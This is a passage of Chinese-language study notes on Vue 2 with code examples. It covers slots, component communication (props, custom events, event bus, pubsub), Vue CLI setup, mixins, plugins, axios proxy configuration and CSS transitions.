      foods:["烧烤","白切鸡","小龙虾","牛排"], //美食
      games:["王者","穿越火线","小龙虾","牛排"], //游戏
      films:["《流浪地球》","《深海》","《你好，李焕英》","《魔童降世》"], //电影
    }
  },
};
</script>
```

```vue
<template>
  <div class="category">
    <h3>{{ title }}分类</h3>
    <!-- slot:插槽标签:(默认，当没有传递具体数据时用) -->
    <slot> 
      <ul>
        <li v-for="(items, index) in ListDate" :key="index">{{ items }}</li>
      </ul>
    </slot>
  </div>
</template>
```



#####        具名插槽：

   具名插槽-定义具名: 
​        ①slot="center"
​        ②v-slot:center插槽
   具名插槽-使用具名插槽:   name="center"

App组件：

```vue
<template>
  <div class="container">
    <h1>注意: 此案例要把bootstrap框架先注掉</h1>
    <!-- 使用组件  
       注意：此处title不写成:title也可以传数据，是
      因为不用解析成表达式。 -->
    <Category title="美食">
      <img
        slot="center"
        src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg"
        alt=""
      />
      <a class="foot" slot="footer" href="http:www.baidu.com">更多美食</a>
    </Category>

    <Category title="游戏">
      <ul slot="center" >
        <li v-for="(g, index) in games" :key="index">{{ g }}</li>
      </ul>
      <div class="foot" slot="footer" >
        <a href="www.baidu.com">单击游戏</a>
        <a href="www.baidu.com">网络游戏</a>
      </div>
    </Category>

    <Category title="电影">
      <video
        controls
        src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"
        slot="center"
      ></video
      ><!-- 视频标签 -->
      <template v-slot:footer> <!--  slot="footer" 简写v-slot:footer(注意简写必须在template标签才行) -->
        <div class="foot">
          <a href="www.baidu.com">金典</a>
          <a href="www.baidu.com">热门</a>
          <a href="www.baidu.com">推荐</a>
        </div>
        <h4>欢迎前来观影</h4>
      </template>
    </Category>
  </div>
</template>

<script scope>
import Category from "./components/Category.vue";

//默认暴露
export default {
  name: "App",
  components: { Category },//注册组件
  data() {
    return {
      foods: ["烧烤", "白切鸡", "小龙虾", "牛排"], //美食
      games: ["王者", "穿越火线", "小龙虾", "牛排"], //游戏
      films: ["《流浪地球》", "《深海》", "《你好，李焕英》", "《魔童降世》"], //电影
    };
  },
};
</script>
```

Category组件：

```vue
<template>
  <div class="category">
    <h3>{{ title }}分类</h3>
    <!-- slot:插槽标签:
              设置默认值，当没有传递具体数据时用   -->
      <!-- 具名插槽-使用具名插槽: name="center" -->
    <slot name="center">插槽标签1 </slot>
    <slot name="footer">插槽标签2 </slot>
  </div>
</template>
```





#####        作用域插槽：

​     作用域插槽：数据在组件的自身（子组件），但根据数据生成的结构需要组件的使用者（父组件）来决定。

```
    作用域插槽-使用作用域插槽:   scope="自定义名称" 或slot-scope="自定义名称"
        注意： 作用域插槽必须使用template标签。
        接收参数三方法：①scope="game"
                       ②：slot-scope="game" 
                       ③ scope="{youxis}": 结构赋值
```

###### App组件：

```vue
<template>
  <div class="container">
    <h1>注意: 此案例要把bootstrap框架先注掉</h1>
    <!-- 使用组件  -->
    <Category title="游戏">
      <!-- 作用域插槽-使用作用域插槽:   scope="自定义名称" 或slot-scope="自定义名称"
             注意： 作用域插槽必须使用template标签。
             接收参数三方法：①scope="game"
                            ②：slot-scope="game" 
                            ③ scope="{youxis}": 结构赋值    -->
      <template scope="game"> 
        <ul>
          <li v-for="(g, index) in game.youxis" :key="index">{{ g }}</li>
        </ul>
      </template>
    </Category>

    <Category title="游戏">
      <template scope="game">
        <ol>
          <li v-for="(g, index) in game.youxis" :key="index">{{ g }}</li>
        </ol>
      </template>
    </Category>

    <Category title="游戏">
      <template scope="game">
        <h4 v-for="(g, index) in game.youxis" :key="index">{{ g }}</h4>
      </template>
    </Category>
  </div>
</template>
```



###### Category组件：

```vue
<template>
  <div class="category">
    <h3>{{ title }}分类</h3>
      <!-- 作用域插槽-使用作用域插槽:  :youxis="games"-->
    <slot :youxis="games">作用域插槽 </slot>
  </div>
</template>

<script>
export default {
  name: "Category",
  props: [ "title"], //接收参数
  data() {
    return {
      games: ["王者", "穿越火线", "小龙虾", "牛排"], //游戏
    };
  },
};
</script>
```





### 子传父：

#### props:

```
props适用于：
    ①父组件 ==>子组件 通信
    ②子组件 ==>父组件 通信（父组件必须先给子组件一个函数）
  3、使用v-model使用要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的。
  4、props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错
```

App组件：

```vue
<template>
<div id="app" class="heizi">
    <h1>{{ msg }}</h1>
    <!--子给父传递数据1： 通过父组件给子组件传递函数类型的props实现 -->
    <School :getSchoolName="getSchoolName" />
    </div>
</template>
<script>
    //引入Student.vue
    import School from "./components/School.vue";
    //默认暴露
    export default {
        name: "App",
        components: { School  }, /* 注册组件 */ 
        data() {
            return {
                msg: "你好啊！",
            };
        },
        methods: {//方法区
            getSchoolName(name) {
                console.log("getSchoolName被调用了",name);
            } }
</script>
```

School组件

```vue
<template>
<h3 class="txst">
    <h3 class="font">学校名称：{{ name }}</h3>
    <h3>学校地址：{{ address }}</h3>
    <button @click="sendSchoolName">把学校名字给App</button>
    </h3>
</template>

<script>
    export default {
        name: "School",
        data() {
            return {
                name: "尚硅谷",
                address: "广东",
            };
        },
        props: ["getSchoolName"], //props-接收数据
        methods: { //方法区
            sendSchoolName() {
                // 调用App函数
                this.getSchoolName(this.name); 
            }
        }
    };
</script>
```

#### 自定义事件：

##### 方法1_v-on：

###### App组件：

```vue
<template>
<div id="app" class="heizi">
    <h1>{{ msg }}</h1>
    <!--子给父传递数据2：  通过父组件给子组件绑定一个自定义事件实现（方法1：使用@或v-on） -->
    <!-- <Student v-on:atguigu="getStudentName"/> -->
    <Student @atguigu="getStudentName"/>
    App接收Studen组件的学生名称:{{studentName}}
    </div>
</template>

<script>
    //引入Student.vue
    import Student from "./components/Student.vue";

    //默认暴露
    export default {
        name: "App",
        components: {//注册组件
            Student,
        },
        data() {
            return {
                msg: "你好啊！",
            };
        },
        methods: {//方法区
            // getStudentName(name) { //接收一个参数
            getStudentName(name,...a) { //接收多个参数
                console.log("getStudentName被调用了",name,a);
                this.studentName=name;
            },
        }
    };
</script>
```

###### Student组件：

```vue
<template>
  <h3 class="txst">
    <h3>学生名称：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
    <button @click="sendStudentName">把学生名字给App</button>
    <button @click="unbing">解绑atguigu事件</button>
  </h3>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      name: "张灵玉",
      sex: "男",
    };
  },
  methods: {
    //方法区
    sendStudentName() {
      this.$emit("atguigu",this.name,666,888); //事件名，参数
    },
    unbing(){
      console.log("atguigu事件被解绑了")
      this.$off("atguigu"); //解绑一个绑定事件
    }
  },
};
</script>
```



##### 方法2_ref：

ref：通过父组件给子组件绑定一个自定义事件实现

###### App组件：

```vue
<template>
  <div id="app" class="heizi">
    <h1>{{ msg }}</h1>
    <!-- 使用组件  10_src_子给父传递数据的3方法-->
    <!--子给父传递数据2：  通过父组件给子组件绑定一个自定义事件实现（方法2：使用ref） -->
    <Student ref="studentName" />
  </div>
</template>

<script>
//引入Student.vue
import Student from "./components/Student.vue";

//默认暴露
export default {
  name: "App",
  components: {//注册组件
    Student,
  },
  data() {
    return {
      msg: "你好啊！",
    };
  },
  methods: {//方法区
    // getStudentName(name) { //接收一个参数
    getStudentName(name,...a) { //接收多个参数
      console.log("getStudentName被调用了",name,a);
    },
  },
  mounted() { //挂载完成
    // setTimeout(() => {
      this.$refs.studentName.$on("atguigu", this.getStudentName); //绑定自定义事件
      // this.$refs.studentName.$once("atguigu", this.getStudentName); //绑定自定义事件（一次性）
    // }, 2000);
  },
};
</script>
```

###### student组件：

```vue
<template>
  <h3 class="txst">
    <h3>学生名称：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
    <button @click="sendStudentName">把学生名字给App</button>
    <button @click="unbing">解绑atguigu事件</button>
  </h3>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      name: "张灵玉",
      sex: "男",
    };
  },
  methods: {
    //方法区
    sendStudentName() {
      this.$emit("atguigu",this.name,666,888); //事件名，参数
    },
    unbing(){
      console.log("atguigu事件被解绑了")
      this.$off("atguigu"); //解绑一个绑定事件
    }
  },
};
</script>
```

#### 解绑自定义事件：

​     解绑单个、多个、所有自定义事件。(注意：解绑所有自定义事件是 **<font color="red"> 解绑当前组件的所有自定义事件</font>**)

##### App组件

```vue
<template>
  <div id="app" class="heizi">
    <h1>{{ msg }}</h1>
    <!-- 使用组件 -->
    <!--子给父传递数据：方法1：使用@或v-on  -->
    <School @schoolClick="getSchoolName" />
    <!--通过父组件给子组件绑定一个自定义事件实现(方法1：使用@或v-on) -->
    <!-- <Student v-on:atguigu="getStudentName"/> -->
    <Student @atguigu="getStudentName" @jiebang="m1" />
  </div>
</template>

<script>
//引入Student.vue
import School from "./components/School.vue";
import Student from "./components/Student.vue";

//默认暴露
export default {
  name: "App",
  components: {
    //注册组件
    Student,
    School,
  },
  data() { return { msg: "你好啊！" }  },//数据区
  methods: {//方法区
    getSchoolName(name) {
      console.log("getSchoolName被调用了", name);
    },
    // getStudentName(name) { //接收一个参数
    getStudentName(name, ...a) { //接收多个参数
      console.log("getStudentName被调用了", name, a);
    },
    m1() {
      console.log("jiebang事件被触发了");
    },
  },
```

##### School组件:

```vue
<template>
<h3 class="txst">
    <h3 class="font">学校名称：{{ name }}</h3>
    <h3>学校地址：{{ address }}</h3>
    <button @click="sendSchoolName">把学校名字给App</button>
    </h3>
</template>

<script>
    export default {
        name: "School",
        data() {
            return {
                name: "尚硅谷",
                address: "广东",
            } },
        methods: { //方法区
            sendSchoolName() {
                this.$emit("schoolClick",this.name); //事件名，参数
            },
        },
    };
</script>
```

##### student组件:

```vue
<template>
  <h3 class="txst">
    <h3>学生名称：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
    <button @click="sendStudentName">把学生名字给App</button>
    <button @click="unbing">解绑atguigu事件</button>
    <button @click="deach">销毁了当前Student组件的实例(vc)</button>
  </h3>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      name: "张灵玉",
      sex: "男",
    };
  },
  methods: {//方法区
    sendStudentName() {
      this.$emit("atguigu", this.name, 666, 888); //事件名，参数（参数传可多个）
      // 调用自定义事件
      this.$emit("jiebang"); //事件名，参数
    },
    unbing() {
      console.log("自定义事件被解绑了");
      // this.$off("atguigu"); //解绑单个自定义事件
      // this.$off(["atguigu", "jiebang"]); //解绑多个自定义事件
      this.$off(); //解绑当前组件的所有自定义事件
    },
    deach(){
      this.$destroy();//销毁了当前Student组件的实例,销毁后所有Student实例的自定义事件全都不奏效。
    }
  },
};
</script>
```



### 任意组件间通信：

#### 全局事件总线：

##### 原理：

全局事件总线原理图：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%85%A8%E5%B1%80%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF%E5%8E%9F%E7%90%86%E5%9B%BE.png)

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%A4%9A%E7%BB%84%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%95%B0%E6%8D%AE-%E5%85%A8%E5%B1%80%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF%E5%AE%9E%E7%8E%B0.png)

全局事件总线流程图：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%85%A8%E5%B1%80%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF%E6%B5%81%E7%A8%8B%E5%9B%BE.png)



##### maix.js文件：

```js
/*  项目的入口文件 */
// 引入vue
import Vue from 'vue'
// 引入App组件，他是所有组件的父组件
import App from './App.vue'

// 安装全局事件总线-方法1
/* const Demo = Vue.extend({});
const d = new Demo({});
Vue.prototype.$bus = d; */

// 创建Vue实例对象 --vm
new Vue({
    //将App组件放入容器中
    render: h => h(App),
    beforeCreate() { //创建前
        //安装全局事件总线-方法2(简写)（$bus就是当前应用的vm）
        Vue.prototype.$bus = this
    },
}).$mount("#app")

```

##### School组件：

```vue
<template>
  <h3 class="txst">
    <h3>学生名称：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
    <button @click="sendStudentName">把学生名给School组件</button>
  </h3>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      name: "张灵玉",
      sex: "男",
    };
  },
  mounted() { //挂载完成
    console.log("Student", this.x);
  },
  methods: {//方法区
    sendStudentName() {
      // 使用全局事件总线-定义hello事件
      this.$bus.$emit('hello',this.name) //事件名，参数
    },
  },
};
</script>
```



##### School组件：

```vue
<template>
  <h3 class="txst">
    <h3 class="font">学校名称：{{ name }}</h3>
    <h3>学校地址：{{ address }}</h3>
  </h3>
</template>

<script>
export default {
  name: "School",
  data() {
    return {
      name: "尚硅谷",
      address: "广东",
    };
  },
  mounted() { // 挂载完成
    console.log("School", this.$bus);
    //使用全局事件总线-接收数据
    this.$bus.$on("hello", (data) => {
      console.log("我是School组件,收到了数据", data);
    });
  },
  beforeDestroy() { //销毁前
    //  使用全局事件总线-解绑自定义事件
    this.$bus.$off("hello");
  },
};
</script>
```



#### 消息订阅与发布(pubsub)：

根据pubsub.js库 (publish subscribe)实现消息订阅与发布。



![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/pubsub.js%E6%84%8F%E6%80%9D.png)

原理图：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E6%B6%88%E6%81%AF%E8%AE%A2%E9%98%85%E4%B8%8E%E5%8F%91%E5%B8%83.png)

##### 安装pubsub(仅第一次)

```js
npm i pubsub-js   //vs Code安装pubsub.js
```



##### Student组件：

```vue
<template>
  <h3 class="txst">
    <h3>学生名称：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
    <button @click="sendStudentName">把学生名给School组件</button>
  </h3>
</template>

<script>
// 引入pubsub库
import pubsub from 'pubsub-js';

export default {
  name: "Student",
  data() {
    return {
      name: "张灵玉",
      sex: "男",
    };
  },
  methods: {//方法区
    sendStudentName() {
      //消息订阅与发布-发布：   消息名，参数
      pubsub.publish("hello",this.name);
    },
  },
};
</script>
```

##### School组件：

```vue
<template>
  <h3 class="txst">
    <h3 class="font">学校名称：{{ name }}</h3>
    <h3>学校地址：{{ address }}</h3>
  </h3>
</template>

<script>
// 引入pubsub库
import pubsub from 'pubsub-js';

export default {
  name: "School",
  data() {
    return {
      name: "尚硅谷",
      address: "广东",
    };
  },
  mounted() { // 挂载完成
     //消息订阅与发布-订阅 ：  消息名，回调函数(消息名，参数)
     this.id= pubsub.subscribe("hello",function(msgName,data) {
        console.log("有人发布了hello消息,hello消息的回调执行了",msgName,data)
      })
  },
  beforeDestroy() { //销毁前
    //  消息订阅与发布-取消订阅
    pubsub.unsubscribe(this.id);
  },
};
</script>
```







# 脚手架（Vue CLI）:

脚手架（command line interface）

## 安装&卸载脚手架：

注意：①采用**命令提示符**安装&卸载Vue CLI(脚手架)

​           ②Vue 脚手架隐藏了所有 webpack 相关的配置.

  备注：如出现下载缓慢请配置淘宝镜像路径：(不报错即为切换成功)

```c#
  npm config set registry https://registry.npm.taobao.org
```

```js
    npm install -g @vue/cli //全局安装@vue/cli:  （中途停止可能需要回车,仅第一次安装）
    npm uninstall vue-cli -g 或 yarn global remove vue-cli // 卸载脚手架：

   // 默认：Vue 脚手架隐藏了所有 webpack 相关的配置。
    vue inspect > output.js       //查看webpakc配置-方式1
    npx vue inspect > output.js  //查看webpakc配置-方式2
    npm view webpack versions  //查看webpack的所有版本
    
    npm i less-loader@7 //安装less-loader的7版本（运行less的）
```

脚手架安装成功：

  重启命令提示符输入vue，查看是否安装成功。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E8%84%9A%E6%89%8B%E6%9E%B6%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png)



## 创建&启动&打包脚手架项目：

### 创建

```
vue create xxxx             ES6通过babel转ES5
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%88%9B%E5%BB%BA%E8%84%9A%E6%89%8B%E6%9E%B6.png)

### 启动脚手架：

```sh
# 此模式会对代码执行编译、热启动、错误提示等调试功能
 npm run  dev(开发环境)
	
# 此模式将代码编译成可上线的静态资源，并开启一个静态资源服务器
 npm run  serve(生产/部署环境)
```



![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%90%AF%E5%8A%A8%E8%84%9A%E6%89%8B%E6%9E%B6.png)

### 打包项目：

```c#
npm run build  //打包
```





## 脚手架文件结构：

 ```shell
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面             =======>重要
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件            =======>重要               
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件          =======>重要 
│   │── main.js: 入口文件              =======>重要
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件

api // 接口信息
mock // 模拟服务器效果
node_modules // 依赖
utils // 封装工具
views // 功能页面
tests  // 单元测试
 ```

##  关于不同版本的Vue

​     1.vue.js与vue.runtime.xxx.js的区别：
​         ①vue.js是完整版的Vue,包含：核心功能+模板解析器。
​         ②vue.runtime.xxx.js是运行版的Vue,只包含：核心功能，没有模板解析器。
​     2.因为vue.runtime.xxx.js没有模板解析器，所有不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。
​     注意：带有runtime为运行时vue,运行时vue会把模板解析器去掉。

​      运行时vue图：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E8%BF%90%E8%A1%8C%E6%97%B6vue.png)

## ref属性（id的替代者）

 1.被用来给元素或子组件注册引用信息。
 2.应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象。
 3.使用方式：
     定义：<h1 ref="xxx">... </h1> 或<School ref="xxx"> </School>
     使用： this.$refs.xxx

   注意：可使用$refs调用子组件的方法等。

例：

```vue
<!-- 小时、课时表单对话框 -->
<video-form ref="videoForm" />

<!-- 调用videoForm组件的open方法 -->
this.$refs.videoForm.open(chapterId, videoId);
```



### App组件

```vue
<div id="app"> <!-- 1.定义ref替代ID -->
    <h1 v-text="msg" ref="title"></h1>
    <button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
    <School ref="sch"></School>
    <!-- 使用组件 -->
</div>
<script>
    //引入Student.vue
    import School from "./components/School.vue";
    //默认暴露
    export default {
        name: "App",
        components: {//注册组件
            School,
        },
        data() { //数据区
            return {
                msg: "标题",
            };
        },
        methods: {//方法区
            showDOM() { 
                /*  2.使用ref */
                console.log(this.$refs)  
                console.log(this.$refs.title)
                console.log(this.$refs.btn)
                console.log(this.$refs.sch)
            },
        },
    };
</script>
```

### School组件

```vue
<template>
   <div>
    <div>学校名称：{{ name }}</div>
    <div>学校地址：{{ addres }}</div>
    </div>
</template>
<script>
    export default {
        name: "School",
        data() {
            return {
                name:"尚硅谷",
                addres:"北京"
            }
        },
    };
</script>
```



## mixin混入、混合：

  功能：可以把多个组件共有的配置提取成一个混入对象。

mixin混入流程图：

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/mixin%E6%B7%B7%E5%85%A5%E6%B5%81%E7%A8%8B%E5%9B%BE.png)



### 全局混入：

1.在minax.js文件定义混入

```js
// 分别暴露 ==》 1.定义mixin混入  
export const hunhe = {
    methods: { //方法区
        showName() {  alert(this.name) }
    },
}
```

2.在main.js(项目入口)文件定义

```js
// 引入vue
import Vue from 'vue'
// 引入App组件，他是所有组件的父组件
import App from './App.vue'
// 2.引入混入
import {hunhe} from "./mixin"

Vue.mixin(hunhe) //3.使用mixin混入-全局混合

// 创建Vue实例对象 --vm
new Vue({
    //将App组件放入容器中
    render: h => h(App),
}).$mount("#app")

```

3.在School组件使用定义混入的方法

```vue
<template>
<h3>   <!-- 使用定义混入的方法 -->
    <h3 @click="showName">学校名称：{{ name }}</h3>
    <h3>学校地址：{{ address }}</h3>
    </h3>
</template>
<script>
    export default {
        name: "School",
        data() {
            return {
                name:"尚硅谷",
                address:"广东"
            }
        }
    };
</script>
```



### 局部引入：

1.在minax.js文件定义混入

```js
// 分别暴露 ==》 1.定义mixin混入  
export const hunhe = {
    methods: { //方法区
        showName() {
            alert(this.name)
        }
    },
}
```

Student组件：

```html
<template>
    <h3> <!-- 4.使用混入的方法 -->
        <h3 @click="showName">学生名称：{{ name }}</h3>
        <h3>学生性别：{{ sex }}</h3>
    </h3>
</template>

<script>
    // 2.引入mixin混入
    import {hunhe} from "../mixin"

    export default {
        name: "Student",
        data() {
            return {
                name:"张灵玉",
                sex: "男",
            };
        },
        mixins:[hunhe] //3.使用mixin混入-局部混入
    };
</script>
```



package.json文件：

```js
"scripts": {
  "serve": "vue-cli-service serve", /* 运行项目 */
  "build": "vue-cli-service build", /*项目打包：.vue转html,js,css*/
  "lint": "vue-cli-service lint"    /* 语法检查 */ 
 },   // eslint、jslint、jshint  ==>lintOnSave  //关闭语法检查 (webpack 基于Node)
  
  cd Desktop //返回桌面目录
  Strig str='';               
  console.log(typeof str);  //查看输出值类型
```

##  插件：
  功能：用于增强Vue。
  本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。
  定义插件：

```js
对象.install = function(Vue,options){
    // 1.添加全局过滤器
    Vue.filter()

    // 2.添加全局指令
    Vue.directive()

    // 3.配置全局混入（合）
    Vue.mixin()

    //4.添加实例方法
    Vue.prototype.$myMethod = function () {}
    Vue.prototype.$myProperty = xxxx
}

使用插件：Vue.use()
```

## scoped（作用域）：

​    作用：让样式在局部生效，防止冲突。
​    写法：<style scoped>
​    注意：脚手架要运行less必须安装less-loader才行。

```vue
<style  lang="less" scoped> /* scoped:作用域 */  
  .txst{
    background-color: orange;
  }
</style>
```



## nanoid：

nanoid随机生成id

### 安装nanoid:

```js
npm i nanoid  //安装nanoid
```

### 使用nanoid:

```vue
<script>
    // 引入nanoid
    import { nanoid } from "nanoid";

export default {
    name: "MyHeader",
    methods: {  //方法区
        addItem(e) {
            const todoObj = { id: nanoid(), title: e.target.value, done: false };
            console.log(todoObj);
        },
    },
};
</script>
```

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E4%BD%BF%E7%94%A8nanoid.png)

## 网络请求：

### 请求方式：

```
xhr
jQuery
axios
fetch
vue-resource插件
```



####  Vue-resource插件:

```js
npm i axios  //  安装axios.js
npm i vue-resource // 安装Vue-resource
```



### 解决**Ajax**跨域问题：

   跨域问题: 浏览器对Ajax请求一种限制。

跨域问题的三个地方：

1. 访问协议：http   https，
2. 地址Ip: 192(后端) 172(前端端),
3. 端口号: 9828(前端)  8301(后端)

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98.png)

#### 1.cors

​    需要前、后端配合使用。

#### 2.jsonp script src

  注意：  jsonp只能解决get请求跨域，不能解决post等请求。

#### 3.代理服务器：

   代理服务器：解决**后端**与**前端**端口不一致的问题。

   注意：①代理服务器默认使用的是vue-cli(脚手架)的public里的文件；

​             ②代理服务器只能使用一个代理。

后端：8080       前端：5000

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8.png)

​     1.配置类方式(实现WebMvcConfigurer)  2.使用@CrossOrigin注解  3.使用nginx反向代理解决跨域  4.Vue中配置代理服务器

#####  单个请求：

​              1.优点：配置简单，请求资源是直接发给前端（8080即可）。
​              2.缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
​              3.工资方式：若按照上述配置代理，当请求了前端不存在的资源是，那么请求会转发给服务器（优先匹配全端资源）。

###### vue.config.js文件:

```js
   devServer: { //开启代理服务器-方式1（单个请求）
     proxy: 'http://localhost:5000' // 要转发的服务器路径
   } 
```

###### App组件:

```vue
<template>
  <div id="app">
    <button @click="getStudents">获取学生信息</button>
  </div>
</template>

<script>
// 引入axios.js
import axios from "axios";

//默认暴露
export default {
  name: "App",
  methods: {//方法区
    getStudents() {
        //原服务器端口5000，前端端口8080
      axios.get("http://localhost:8080/students").then( 
        response=>{//成功
          console.log("请求成功了",response.data);
        }, 
        error=>{ //失败
          console.log("请求失败了",error.message);
        }
      )},
  },
};
</script>
```





##### 多个请求：

​              1.优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
​              2.缺点：配置略微繁琐，请求资源是必须加前缀。

###### vue.config.js文件

```js
devServer: {//开启代理服务器-方式2（多个请求）
    proxy: {
      '/atguigu': { //请求路径的“请求前缀”
        target: "http://localhost:5000", //请求路径
        pathRewrite:{'^/atguigu':''}, //去掉请求路径中的“请求前缀”
        ws: true, //支持websocket
        changeOrigin: true // 用于控制请求头中的host（端口）值，ture为8080 ，false为5000；(默认为true,单在va脚手架里默认为false。) 
      },
      '/lujing2': { //请求前缀
        target: "http://localhost:5001", //请求路径
        pathRewrite:{'^/lujing2':''}, //请求路径去掉请求前缀
        ws: true, //支持websocket
        changeOrigin: true // 用于控制请求头中的host（端口）值
      }
    } 
  }
```

###### App组件：

```vue
<template>
  <div id="app">
    <button @click="getStudents">获取学生信息</button>
    <button @click="getCars">获取汽车信息</button>
  </div>
</template>

<script>
// 引入axios.js
import axios from "axios";

//默认暴露
export default {
  name: "App",
  methods: {
    //方法区
    getStudents() {
          console.log("222");
    //原服务器5000, 代理服务器8080。  注意：请求前缀必须在端口号后面。
      axios.get("http://localhost:8080/atguigu/students").then( 
        response=>{
          console.log("请求成功了",response.data);
        }, //成功
        error=>{
          console.log("请求失败了",error.message);
        } //失败
      )
    },
    getCars() {
          console.log("333");
      axios.get("http://localhost:8080/lujing2/cars").then( 
        response=>{//成功
          console.log("请求成功了",response.data);
        }, 
        error=>{//失败
          console.log("请求失败了",error.message);
        } //失败
      )
    },
  },
};
</script>
```







## 组件之间的传输：

子传父：通过函数传输。

父传子：通过props传输。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E7%BB%84%E4%BB%B6%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BC%A0%E8%BE%93.png)

### 全局事件总线：

功能：**任意组件间通信**。

![](../../%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87/%E5%89%8D%E7%AB%AF/Vue/%E5%85%A8%E5%B1%80%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF%E5%8E%9F%E7%90%86%E5%9B%BE.png)

#### 安装全局事件总线：



## $nextTick:



# Css3:

​    1.作用：在合适的时候（在插入、更新或移除DOM元素时）给元素添加样式类名。



 



## transition标签(单个元素过渡)：

```js
transition标签：
   appear属性：（ 默认transition标签：执行“进入过程中”代码：）   
​      默认写法: :appear="true"  
​      简写：appear
```

```vue
<template>
<div class="txst">
    <h1>transition标签</h1>
    <button @click="showName = !showName">显示/隐藏</button>
    <transition appear>
        <h3 v-if="showName">你好啊</h3>
    </transition>
    </div>
</template>
<script>
    export default {
        name: "Text1",
        data() { return { showName: true,}; },
    };
</script>

<style scoped>/* scoped:作用域 */
    h3 { /* 动画过渡-过渡 */
        background-color: orange;
    }

    .v-enter-active {
        /* 进入过程中：v-enter-active（注意名字不能修改） */
        animation: atguigu 1s; /* 使用关键帧 */
    }
    .v-leave-active {/* 结束过程中：v-leave-active */
        animation: atguigu 1s reverse; /* reverse：反转 */
    }

    /* 定义关键帧 */
    @keyframes atguigu {
        from {
            /* 开始 */
            transform: translate(-100%);
        }
        to {
            /* 结束 */
            transform: translate(0px);
        }
    }
</style>
```

## transition标签2：

```vue
<template>
  <div class="txst">
    <h1>元素进入、离开的样式</h1>
    <button @click="showName =!showName">显示/隐藏</button>
    <transition appear>  
       <h3 v-if="showName" >你好啊3</h3>
    </transition>
  </div>
</template>

<script>
export default {
  name: "Text3",
  data() { return { showName: true }; },
};
</script>

<style scoped>/* scoped:作用域 */
h3{ /* 过渡与动画-过渡 */
  background-color: orange;
  /* 方式1: */
  /* transition: 1s  ;  */
}
/* 方式2： */
.v-enter-active,.v-leave-active{
   /* 匀速移动：linear */
  transition: 1s;
}

.v-enter,.v-leave-to{ /* 进入的起点,离开的终点 */
    transform: translateX(-100%); /* X轴移动 */
}
.v-enter-to,.v-leave { /* 进入的终点,离开的起点 */
    transform: translateX(0px);
}
</style>
```



## transition-group标签(多个元素过渡):

```vue
<template>
  <div class="txst">
    <h1>transition-grou标签</h1>
    <button @click="showName = !showName">显示/隐藏</button>
    <!-- 注意：transition-group标签必须有key值 -->
    <transition-group appear>
      <h3 v-if="!showName" key="1">你好啊</h3>
      <h3 v-if="showName" key="2">尚硅谷</h3>
    </transition-group>
  </div>
</template>

<script>
export default {
  name: "Text4",
  data() {return { showName: true };},
};
</script>

<style scoped>/* scoped:作用域 */
h3 {
  background-color: orange;
}

.v-enter-active,.v-leave-active{
   /* 匀速移动：linear */
  transition: 1s;
}

.v-enter,.v-leave-to{ /* 进入的起点,离开的终点 */
